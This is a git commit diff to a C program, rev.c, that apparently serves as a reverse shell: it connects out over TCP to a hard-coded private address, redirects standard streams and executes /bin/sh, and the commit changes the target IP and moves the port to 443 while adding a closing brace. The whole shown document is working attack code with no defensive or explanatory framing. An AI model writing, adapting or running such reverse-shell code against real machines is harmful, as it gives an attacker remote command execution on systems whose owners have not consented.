fb818ea466b40be991bfefe072506dbb37457aa7
740i <740i@users.noreply.github.com>
2016-10-07 22:55:07 -0700

    Update rev.c

--- rev.c
+++ rev.c
@@ -8,14 +8,14 @@
 
 int main(void) {
     int sockfd;
-    int lportno = 12345;
+    int lportno = 443;
     struct sockaddr_in serv_addr;
     char *const params[] = {"/bin/sh", NULL};
     char *const environ[] = {NULL};
 
     sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     serv_addr.sin_family = AF_INET;
-    serv_addr.sin_addr.s_addr = inet_addr("192.168.1.151");
+    serv_addr.sin_addr.s_addr = inet_addr("172.16.236.142");
     serv_addr.sin_port = htons(lportno);
     connect(sockfd, (struct sockaddr *) &serv_addr, 16);
 
@@ -23,3 +23,4 @@ int main(void) {
     dup2(0, 1);
     dup2(0, 2);
     execve("/bin/sh", params, environ);
+}
